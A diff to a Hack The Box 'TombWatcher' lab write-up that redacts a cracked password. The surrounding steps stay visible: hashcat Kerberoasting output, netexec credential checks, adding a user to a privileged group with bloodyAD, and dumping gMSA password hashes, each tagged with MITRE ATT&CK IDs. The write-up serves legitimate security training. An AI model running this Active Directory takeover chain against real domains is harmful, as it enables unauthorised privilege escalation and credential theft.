@@ -320,7 +320,7 @@ Dictionary cache hit:
 * Bytes.....: 139921497  
 * Keyspace..: 14344384  
   
-[REDACTED]:basketball  
+[REDACTED]:[REDACTED]
                                                             
 Session..........: hashcat  
 Status...........: Cracked  
@@ -345,7 +345,7 @@ Started: Sat Jul 18 05:03:58 2026
 Stopped: Sat Jul 18 05:04:01 2026
 ```
 
-We got `alfred:basketball`.
+We got `alfred:[REDACTED]`.
 
 MITRE ATT&CK ID : T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting
 
@@ -373,13 +373,13 @@ If SOC missed it, CTI/hunters still string: henry source IP → LDAP sweep → S
 Time delay only helps if nobody is correlating identity events, this is why we start moving fast now.
 
 ```bash
->  nxc smb DC01.tombwatcher.htb -u 'alfred' -p 'basketball'  
+>  nxc smb DC01.tombwatcher.htb -u 'alfred' -p '[REDACTED]'  
   
 SMB         10.129.41.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
-SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\alfred:basketball
+SMB         10.129.41.160   445    DC01             [+] tombwatcher.htb\alfred:[REDACTED]
 ```
 
-`alfred:basketball` confirmed with `netexec` , `EventID=4624`
+`alfred:[REDACTED]` confirmed with `netexec` , `EventID=4624`
 
 MITRE ATT&CK ID : T1078 - Valid Accounts
 
@@ -388,7 +388,7 @@ MITRE ATT&CK ID : T1078 - Valid Accounts
 This is big. We'll start by adding `alfred` to the `Infrastructure` group.
 
 ```bash
->  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'INFRASTRUCTURE' 'alfred'  
+>  /usr/bin/bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u 'alfred' -p '[REDACTED]' add groupMember 'INFRASTRUCTURE' 'alfred'  
   
 [+] alfred added to INFRASTRUCTURE
 ```
@@ -400,10 +400,10 @@ MITRE ATT&CK ID : T1098.001 Account Manipulation - Group Membership Addition
 We then use our `Outbound Control` as a member of `Infrastructure` to read the `gMSA password` :
 
 ```bash
->  nxc ldap DC01.tombwatcher.htb -u 'alfred' -p 'basketball' --gmsa  
+>  nxc ldap DC01.tombwatcher.htb -u 'alfred' -p '[REDACTED]' --gmsa  
   
 LDAP        10.129.41.160   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)    
-LDAP        10.129.41.160   389    DC01             [+] tombwatcher.htb\alfred:basketball    
+LDAP        10.129.41.160   389    DC01             [+] tombwatcher.htb\alfred:[REDACTED]    
 LDAP        10.129.41.160   389    DC01             [*] Getting GMSA Passwords  
 LDAP        10.129.41.160   389    DC01             Account: ansible_dev$         NTLM: [REDACTED]     PrincipalsAllowedToReadPassword: Infrastructure  
 LDAP        10.129.41.160   389    DC01             Account: ansible_dev$         aes128-cts-hmac-sha1-96: [REDACTED]  
